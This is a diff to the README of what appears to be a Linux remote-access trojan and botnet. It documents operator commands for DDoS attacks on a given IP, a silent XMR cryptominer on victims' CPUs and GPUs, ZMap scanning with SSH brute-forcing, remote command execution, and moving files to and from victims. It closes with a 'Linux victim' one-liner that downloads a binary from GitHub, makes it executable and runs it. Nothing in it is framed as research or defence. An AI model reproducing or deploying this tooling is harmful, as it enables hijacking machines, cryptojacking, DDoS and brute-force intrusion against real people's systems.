@@ -16,7 +16,6 @@ bnt: @udbnt
 * Mining uses "xmrig"
 
 # Soon
-* Zmap entine network scan (bruteforce scanned ssh by: https://github.com/bntr00t/sshb)
 * Webcam picture
 * ?
 
@@ -26,22 +25,19 @@ bnt: @udbnt
 * !check                                 (Check miner & ddos status)
 * !update                                (Update RAT)
 
-* !ddos < IP >                             (Start DDoS Attack)
+* !ddos < IP >                           (Start DDoS Attack)
 * !stopddos                              (Stop DDoS)
 
-* !miner < WALLET >                        (Start slient XMR Crypto Miner CPU + AMD/INTEL GPU's)
+* !miner < WALLET >                      (Start slient XMR Crypto Miner CPU + AMD/INTEL GPU's)
 * !stopminer                             (Stop miner)
-
-* !zmap                                  (ZMap scan 90 ip addresses)
-* !stopzmap                              (Stop ZMap)
-* !zmapreport                            (ZMap report)
+* !zmap                                  (ZMap scan 100 ip addresses) (Bruteforce iplist.txt by: https://github.com/bntr00t/sshb)
 
 # Self Commands
 
-* !info.< HOSTNAME >@< IP >                  (Send IP Information)
-* !shell.< HOSTNAME >@< IP > < CMD >           (Run command)
+* !info.< HOSTNAME >@< IP >                      (Send IP Information)
+* !shell.< HOSTNAME >@< IP > < CMD >             (Run command)
 * !download.< HOSTNAME > < IP > < URL > < NAME > (Download file to victim)
-* !upload.< HOSTNAME >@< IP > < PATH >         (Upload file to bot)
+* !upload.< HOSTNAME >@< IP > < PATH >           (Upload file to bot)
 
 # Linux victim
 cd /boot; apt-get update -y; apt-get install curl -y; [ -f "Client" ] && rm Client; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; ./Client
